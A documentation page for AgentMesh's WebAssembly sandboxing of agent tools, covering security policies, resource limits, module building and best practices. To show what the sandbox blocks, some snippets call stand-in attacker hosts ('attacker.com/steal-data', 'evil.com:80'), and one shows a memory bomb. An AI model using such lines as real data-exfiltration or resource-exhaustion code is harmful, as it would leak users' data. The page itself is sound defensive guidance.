---
layout: doc
title: WASM Tool Sandboxing
permalink: /wasm-sandboxing/
hero:
  title: Execute untrusted code safely
  description: Use WebAssembly to run third-party tools in a memory-safe sandbox with strict resource limits and controlled host access.
  primary_cta:
    label: Quick start
    href: "#quick-start"
  secondary_cta:
    label: WASM API reference →
    href: "https://pkg.go.dev/github.com/hupe1980/agentmesh/pkg/tool/wasm"
    external: true
sidebar:
  - title: Overview
    url: "#overview"
  - title: Quick start
    url: "#quick-start"
  - title: Security policies
    url: "#security-policies"
  - title: Resource limits
    url: "#resource-limits"
  - title: Building WASM modules
    url: "#building-wasm-modules"
  - title: Security guarantees
    url: "#security-guarantees"
  - title: Performance
    url: "#performance"
  - title: Best practices
    url: "#best-practices"
---

AgentMesh provides WebAssembly-based tool sandboxing for securely executing untrusted or third-party code.

WASM tools run inside a lightweight, memory-safe sandbox enforced by the WebAssembly runtime. Each tool operates in its own isolated environment with strict resource limits and no access to the host system unless explicitly granted through controlled interfaces (e.g., WASI capabilities).

When combined with containerization or process isolation, this approach achieves defense-in-depth comparable to kernel-level isolation—but with the speed and portability of WebAssembly.

---

## Overview {#overview}

### Why WASM sandboxing?

Traditional tool sandboxing approaches have critical security limitations:

**User-space restrictions** can be bypassed:
```go
// ❌ Malicious code can bypass HTTP client restrictions
func maliciousTool() {
    // Ignores your custom HTTP client restrictions
    client := &http.Client{}
    client.Get("https://attacker.com/steal-data")
}
```

**Docker containers** add complexity:
- Requires Docker daemon running
- Significant resource overhead (100+ MB per container)
- Complex networking and volume management
- OS-specific limitations

**Process isolation** is platform-dependent:
- Different implementations for Linux/macOS/Windows
- Requires careful privilege management
- Can still access filesystem and network unless explicitly restricted

### WASM advantages

WebAssembly provides **runtime-enforced security** through the sandbox:

| Feature | WASM Sandbox | Docker | Process Isolation |
|---------|--------------|--------|-------------------|
| Memory isolation | ✅ Guaranteed | ✅ Yes | ⚠️ OS-dependent |
| Network blocking | ✅ Cannot bypass | ⚠️ Configurable | ⚠️ Manual |
| Filesystem blocking | ✅ Cannot bypass | ⚠️ Configurable | ⚠️ Manual |
| Cross-platform | ✅ Same everywhere | ⚠️ Requires Docker | ❌ Different per OS |
| Startup overhead | ✅ 1-5ms | ❌ 100-500ms | ⚠️ 10-50ms |
| Memory overhead | ✅ 1-2 MB | ❌ 100+ MB | ⚠️ 10+ MB |
| Can be bypassed | ❌ No | ⚠️ If misconfigured | ⚠️ If misconfigured |

**WASM security is enforced by the runtime and cannot be bypassed by malicious code. When layered with OS-level isolation, this provides defense-in-depth.**

---

## Quick start {#quick-start}

### Create a WASM tool

```go
import (
    "context"
    "os"
    "github.com/hupe1980/agentmesh/pkg/agent"
    "github.com/hupe1980/agentmesh/pkg/tool/wasm"
)

// Load compiled WASM module
wasmBytes, err := os.ReadFile("calculator.wasm")
if err != nil {
    log.Fatal(err)
}

// Create sandboxed tool with compute-only policy
tool, err := wasm.NewWASMTool(
    "calculator",
    "Evaluate mathematical expressions in a sandboxed environment",
    wasmBytes,
    wasm.WithPolicy(wasm.ComputeOnlyPolicy()),
)
if err != nil {
    log.Fatal(err)
}

// Use in ReAct agent
agent, _ := agent.NewReActAgent(model, []tool.Tool{tool})
```

### Execute safely

```go
// Agent can safely call the WASM tool
messages := []message.Message{
    message.NewHumanMessageFromText("Calculate (2 + 3) * 4"),
}

results, err := agent.Invoke(ctx, messages)
// Tool executes in isolated WASM environment
// No access to network, filesystem, or host memory
```

---

## Security policies {#security-policies}

WASM tools enforce security through **sandbox policies** that define available capabilities. AgentMesh provides six preset policies for common use cases.

### Compute-only policy (default)

**Use case:** Pure computation without external access

```go
tool, _ := wasm.NewWASMTool(
    "math_engine",
    "Pure mathematical computations",
    wasmBytes,
    wasm.WithPolicy(wasm.ComputeOnlyPolicy()),
)
```

**Allowed:**
- ✅ Mathematical operations
- ✅ String processing
- ✅ Data transformations
- ✅ Memory allocations (within limits)
- ✅ JSON parsing and generation

**Blocked:**
- ❌ Network access (TCP, UDP, HTTP, DNS)
- ❌ Filesystem access (read/write/list)
- ❌ System calls
- ❌ Random number generation
- ❌ Clock/time access
- ❌ Environment variables

**Example use cases:**
- Data transformation and parsing
- Mathematical computations
- Cryptographic hashing
- Text processing and formatting

### Network-only policy

**Use case:** HTTP API clients and data fetching

```go
tool, _ := wasm.NewWASMTool(
    "api_client",
    "Call external HTTP APIs",
    wasmBytes,
    wasm.WithPolicy(wasm.NetworkOnlyPolicy()),
)
```

**Allowed:**
- ✅ HTTP/HTTPS requests
- ✅ TCP/UDP connections
- ✅ DNS resolution
- ✅ WebSocket connections

**Blocked:**
- ❌ Filesystem access
- ❌ Process spawning
- ❌ System modification

**Example use cases:**
- REST API clients
- Web scraping
- External service integration
- Webhook notifications

### File processing policy

**Use case:** Processing files in specific directories

```go
tool, _ := wasm.NewWASMTool(
    "csv_processor",
    "Process CSV files from data directory",
    wasmBytes,
    wasm.WithPolicy(wasm.FileProcessingPolicy(
        []string{"/data/input", "/data/output"}, // Allowed paths
        false,                                     // false = read-write, true = read-only
    )),
)
```

**Allowed:**
- ✅ Read/write files in specified paths only
- ✅ List directory contents
- ✅ Check file metadata

**Blocked:**
- ❌ Access outside allowed paths
- ❌ Network access
- ❌ Process spawning

**Example use cases:**
- Log file processing
- CSV/JSON data transformation
- Report generation
- Batch file operations

### Deterministic policy

**Use case:** Reproducible computations

```go
tool, _ := wasm.NewWASMTool(
    "hash_function",
    "Cryptographic hashing with guaranteed reproducibility",
    wasmBytes,
    wasm.WithPolicy(wasm.DeterministicPolicy()),
)
```

**Behavior:**
- Creates a fresh module instance for every call
- Ensures the same input always produces the same output
- Prevents state leakage between invocations

**Example use cases:**
- Cryptographic operations
- Content hashing
- Testing and validation
- Reproducible data processing

### Permissive policy

**Use case:** Trusted internal tools (use with caution)

```go
tool, _ := wasm.NewWASMTool(
    "system_tool",
    "Trusted internal operations",
    wasmBytes,
    wasm.WithPolicy(wasm.PermissiveSandboxPolicy()),
)
```

**Allowed:**
- ✅ All capabilities enabled
- ✅ Network access
- ✅ Filesystem access
- ✅ System calls

**⚠️ Warning:** Only use for trusted, internal tools. Provides no security isolation.

### Default policy

**Use case:** Balanced security for third-party tools

```go
tool, _ := wasm.NewWASMTool(
    "third_party",
    "Third-party tool with balanced security",
    wasmBytes,
    // Uses DefaultSandboxPolicy() if no policy specified
)
```

**Configuration:**
- Moderate memory limits (128 MB)
- 30-second timeout
- No network or filesystem access
- Instance reuse enabled for performance

---

## Resource limits {#resource-limits}

All policies support configurable resource constraints to prevent resource exhaustion attacks.

### Memory limits

Restrict maximum memory usage:

```go
policy := wasm.ComputeOnlyPolicy()
policy.MaxMemoryBytes = 50 * 1024 * 1024  // 50 MB limit

tool, _ := wasm.NewWASMTool("compute", "desc", wasmBytes,
    wasm.WithPolicy(policy))
```

**Default limits by policy:**
- Compute-only: 128 MB
- Network-only: 256 MB
- File processing: 512 MB
- Permissive: 1 GB

### Timeout limits

Prevent infinite loops and long-running operations:

```go
policy := wasm.ComputeOnlyPolicy()
policy.TimeoutDuration = 5 * time.Second  // 5 second timeout

tool, _ := wasm.NewWASMTool("compute", "desc", wasmBytes,
    wasm.WithPolicy(policy))
```

**Default timeouts:**
- Compute-only: 10 seconds
- Network-only: 30 seconds
- File processing: 60 seconds

### Instance reuse

Control module instantiation strategy:

```go
policy := wasm.ComputeOnlyPolicy()
policy.InstanceReuse = wasm.ReuseNever  // Fresh instance per call

tool, _ := wasm.NewWASMTool("compute", "desc", wasmBytes,
    wasm.WithPolicy(policy))
```

**Options:**
- `ReuseAlways` - Reuse module instance (fastest, but state persists)
- `ReuseNever` - Fresh instance per call (slowest, but guaranteed isolation)
- `ReuseConditional` - Reuse based on policy security level (default)

### Custom policies

Create fine-grained policies for specific requirements:

```go
customPolicy := &wasm.SandboxPolicy{
    // Resource limits
    MaxMemoryBytes:  10 * 1024 * 1024,  // 10 MB
    TimeoutDuration: 2 * time.Second,     // 2 seconds
    
    // Capabilities
    AllowNetworkAccess:    false,
    AllowFilesystemAccess: false,
    AllowRandomness:       false,
    AllowClockAccess:      false,
    
    // Filesystem (if enabled)
    AllowedPaths:    []string{},
    ReadOnlyPaths:   false,
    
    // Module instantiation
    InstanceReuse: wasm.ReuseNever,
    
    // Security level
    SecurityLevel: wasm.SecurityLevelThirdParty,
}

tool, _ := wasm.NewWASMTool("custom", "desc", wasmBytes,
    wasm.WithPolicy(customPolicy))
```

---

## Building WASM modules {#building-wasm-modules}

WASM tools require compiled WebAssembly modules. This section covers building optimized modules with Rust (recommended) and TinyGo.

### Rust (recommended)

Rust produces the smallest and most efficient WASM binaries.

#### Basic structure

```rust
// src/lib.rs
use std::ffi::{CStr, CString};
use std::os::raw::c_char;

#[no_mangle]
pub extern "C" fn call(input_ptr: *const c_char) -> *mut c_char {
    // Parse input JSON
    let input = unsafe { CStr::from_ptr(input_ptr).to_string_lossy() };
    
    // Process (example: echo)
    let result = format!("Received: {}", input);
    
    // Return result
    CString::new(result).unwrap().into_raw()
}

// Optional: Expose specific functions
#[no_mangle]
pub extern "C" fn add(a: f64, b: f64) -> f64 {
    a + b
}
```

#### Build configuration

```toml
# Cargo.toml
[package]
name = "my-wasm-tool"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"

[profile.release]
opt-level = "z"      # Optimize for size
lto = true           # Link-time optimization
strip = true         # Strip debug symbols
panic = "abort"      # Smaller panic handler
codegen-units = 1    # Better optimization
```

#### Build command

```bash
# Build optimized WASM
cargo build --target wasm32-unknown-unknown --release

# Output location
# target/wasm32-unknown-unknown/release/my_wasm_tool.wasm
```

**Typical binary size:** 70-130 KB (highly optimized)

#### JSON processing example

{% raw %}
```rust
use serde::{Deserialize, Serialize};
use serde_json;
use std::ffi::{CStr, CString};
use std::os::raw::c_char;

#[derive(Deserialize)]
struct Input {
    operation: String,
    a: f64,
    b: f64,
}

#[derive(Serialize)]
struct Output {
    result: f64,
    operation: String,
}

#[no_mangle]
pub extern "C" fn call(input_ptr: *const c_char) -> *mut c_char {
    let input_str = unsafe { CStr::from_ptr(input_ptr).to_string_lossy() };
    
    // Parse JSON input
    let input: Input = match serde_json::from_str(&input_str) {
        Ok(v) => v,
        Err(e) => {
            let error = format!("{{\"error\": \"{}\"}}", e);
            return CString::new(error).unwrap().into_raw();
        }
    };
    
    // Perform operation
    let result = match input.operation.as_str() {
        "add" => input.a + input.b,
        "subtract" => input.a - input.b,
        "multiply" => input.a * input.b,
        "divide" => {
            if input.b == 0.0 {
                let error = "{\"error\": \"division by zero\"}";
                return CString::new(error).unwrap().into_raw();
            }
            input.a / input.b
        }
        _ => {
            let error = format!("{{\"error\": \"unknown operation: {}\"}}", input.operation);
            return CString::new(error).unwrap().into_raw();
        }
    };
    
    // Return JSON output
    let output = Output {
        result,
        operation: input.operation,
    };
    let output_str = serde_json::to_string(&output).unwrap();
    CString::new(output_str).unwrap().into_raw()
}
```
{% endraw %}

### TinyGo

For Go developers, TinyGo can compile to WASM (larger binaries than Rust).

```go
//go:build wasm
package main

import "syscall/js"

func add(this js.Value, args []js.Value) interface{} {
    a := args[0].Float()
    b := args[1].Float()
    return a + b
}

func call(this js.Value, args []js.Value) interface{} {
    input := args[0].String()
    // Process input...
    return "result"
}

func main() {
    js.Global().Set("add", js.FuncOf(add))
    js.Global().Set("call", js.FuncOf(call))
    <-make(chan bool)
}
```

**Build:**

```bash
tinygo build -o tool.wasm -target wasm main.go
```

**Binary size:** 400-1000 KB (larger than Rust)

### Tool interface contract

All WASM modules must expose a `call` function that accepts and returns JSON strings:

**Function signature:**
```rust
pub extern "C" fn call(input_ptr: *const c_char) -> *mut c_char
```

**Input format:** JSON string with tool parameters
**Output format:** JSON string with result or error

**Example interaction:**

```go
// Agent calls tool with JSON input
input := `{"operation": "add", "a": 5, "b": 3}`

// WASM module processes and returns JSON
output := `{"result": 8, "operation": "add"}`
```

---

## Security guarantees {#security-guarantees}

WASM tools provide verifiable security guarantees enforced by the Wazero runtime.

### 1. Memory isolation

**Guarantee:** WASM modules have isolated linear memory and cannot access host memory or other processes.

**How it works:**
- Each module has its own memory space (linear memory)
- No pointers to host memory
- No memory sharing between modules
- Buffer overflows contained within module
- All host access must go through explicitly imported functions

**Cannot bypass:** Memory isolation is enforced by the WASM runtime, not by the guest code.

### 2. No syscalls by default

**Guarantee:** Network, filesystem, and system calls are blocked unless explicitly enabled through WASI capabilities.

**How it works:**
- WASM modules have no direct syscall access
- All host interactions must go through imported functions (WASI interfaces)
- Wazero only imports functions explicitly allowed by the sandbox policy
- Unauthorized operations fail at runtime

**Example (blocked network attempt):**

```rust
// ❌ This will fail at runtime
use std::net::TcpStream;

fn malicious() {
    // Runtime error: "operation not supported"
    TcpStream::connect("evil.com:80").unwrap();
}
```

**Cannot bypass:** The WASM runtime does not provide networking capabilities unless the policy explicitly grants them via WASI.

### 3. Resource limits

**Guarantee:** Memory and CPU usage are strictly enforced by the runtime.

**How it works:**
- Memory allocations are tracked by the runtime
- Timeout enforced via context cancellation
- Excessive allocations trigger runtime errors

**Example (blocked memory bomb):**

```rust
// ❌ Exceeds memory limit
fn memory_bomb() {
    // Runtime error: "out of memory"
    let bomb: Vec<u8> = Vec::with_capacity(1_000_000_000);
}
```

### 4. Controlled host access

**Guarantee:** All host system access must go through explicitly granted capabilities.

**How it works:**
- WASM modules can only interact with the host via imported functions
- The sandbox policy controls which capabilities (WASI interfaces) are available
- Network, filesystem, and other sensitive operations require explicit grants
- No direct access to native APIs or system calls

### 5. Sandboxed errors

**Guarantee:** Errors and panics are contained within the module.

**How it works:**
- Panics become WASM traps
- Traps are caught by the runtime
- Host process continues normally

**Example:**

```rust
// ❌ Panic is contained
fn panic_handler() {
    panic!("This won't crash the host");
}
// Agent receives: {"error": "wasm trap: unreachable"}
```

---

## Performance {#performance}

WASM tool performance characteristics:

### Startup costs

| Operation | Time | Notes |
|-----------|------|-------|
| Module compilation | 1-2ms | One-time per tool creation |
| Instance creation | 100-500μs | Per fresh instance |
| Function call | 1-5ms | Overhead per invocation |
| Context switch | 50-200μs | WASM ↔ host transition |

### Memory overhead

| Component | Memory | Notes |
|-----------|--------|-------|
| Compiled module | 1-2 MB | Shared across instances |
| Module instance | 200-500 KB | Per instance |
| Linear memory | Configurable | Set via MaxMemoryBytes |

### Throughput

For typical agent workflows:

- **Compute-bound operations:** Near-native performance (5-10% overhead)
- **JSON parsing/serialization:** Efficient with serde_json
- **String operations:** Comparable to native Go

**WASM overhead is negligible compared to LLM inference time** (typically 100-1000ms per request).

### Optimization tips

**1. Reuse instances when safe:**

```go
policy := wasm.ComputeOnlyPolicy()
policy.InstanceReuse = wasm.ReuseAlways  // Faster
```

**2. Set appropriate memory limits:**

```go
policy.MaxMemoryBytes = 10 * 1024 * 1024  // 10 MB for small ops
```

**3. Use streaming for large data:**

Instead of passing large JSON, use multiple smaller calls:

```go
// ❌ Large payload
{"data": [1000000 items...]}

// ✅ Streaming
{"batch": 1, "data": [1000 items]}
{"batch": 2, "data": [1000 items]}
```

---

## Best practices {#best-practices}

### Use the most restrictive policy

Always start with the most restrictive policy that meets your requirements:

```go
// ✅ Good: Compute-only for pure functions
mathTool, _ := wasm.NewWASMTool("math", "desc", wasmBytes,
    wasm.WithPolicy(wasm.ComputeOnlyPolicy()))

// ❌ Bad: Permissive when compute-only works
mathTool, _ := wasm.NewWASMTool("math", "desc", wasmBytes,
    wasm.WithPolicy(wasm.PermissiveSandboxPolicy()))
```

### Set appropriate resource limits

Match limits to expected workload:

```go
// Small, fast operations
policy := wasm.ComputeOnlyPolicy()
policy.MaxMemoryBytes = 10 * 1024 * 1024  // 10 MB
policy.TimeoutDuration = 2 * time.Second

// Large data processing
policy := wasm.FileProcessingPolicy(paths, false)
policy.MaxMemoryBytes = 500 * 1024 * 1024  // 500 MB
policy.TimeoutDuration = 60 * time.Second
```

### Use deterministic policies for reproducibility

Ensure cryptographic and testing operations are reproducible:

```go
hashTool, _ := wasm.NewWASMTool(
    "hash",
    "Cryptographic hashing with guaranteed reproducibility",
    wasmBytes,
    wasm.WithPolicy(wasm.DeterministicPolicy()),
)
```

### Document security expectations

Make capabilities clear in tool descriptions:

```go
tool, _ := wasm.NewWASMTool(
    "api_client",
    "Fetches data from external APIs. Requires network access. No filesystem or random access.",
    wasmBytes,
    wasm.WithPolicy(wasm.NetworkOnlyPolicy()),
)
```

### Handle errors gracefully

WASM errors should be informative:

```rust
// ✅ Good: Structured error messages
if input.value == 0 {
    return CString::new("{\"error\": \"value cannot be zero\"}")
        .unwrap().into_raw();
}

// ❌ Bad: Panic without context
assert!(input.value != 0);
```

### Test with malicious inputs

Verify security policies work as expected:

```go
// Test network blocking
result, err := tool.Call(ctx, `{"url": "http://attacker.com"}`)
// Should fail with "operation not supported"

// Test memory limits
result, err := tool.Call(ctx, `{"allocate_mb": 1000}`)
// Should fail with "out of memory"
```

### Keep modules small

Optimize WASM binary size:

```toml
[profile.release]
opt-level = "z"      # Optimize for size
lto = true           # Link-time optimization
strip = true         # Strip debug symbols
codegen-units = 1    # Better optimization
```

### Use JSON schema validation

Validate inputs before passing to WASM:

```go
type ToolArgs struct {
    Operation string  `json:"operation"`
    A         float64 `json:"a"`
    B         float64 `json:"b"`
}

// Validation happens in Go before WASM call
func validateArgs(args ToolArgs) error {
    if args.Operation == "" {
        return errors.New("operation required")
    }
    if args.Operation == "divide" && args.B == 0 {
        return errors.New("division by zero")
    }
    return nil
}
```

---

## Example

See the [wasm_tool example](https://github.com/hupe1980/agentmesh/tree/main/examples/wasm_tool) for a complete working implementation featuring:

- Rust-based calculator WASM module
- Expression parsing and evaluation
- Integration with ReAct agent
- Security policy demonstration
- Error handling patterns

The example demonstrates building optimized WASM modules and using them safely in agent workflows.
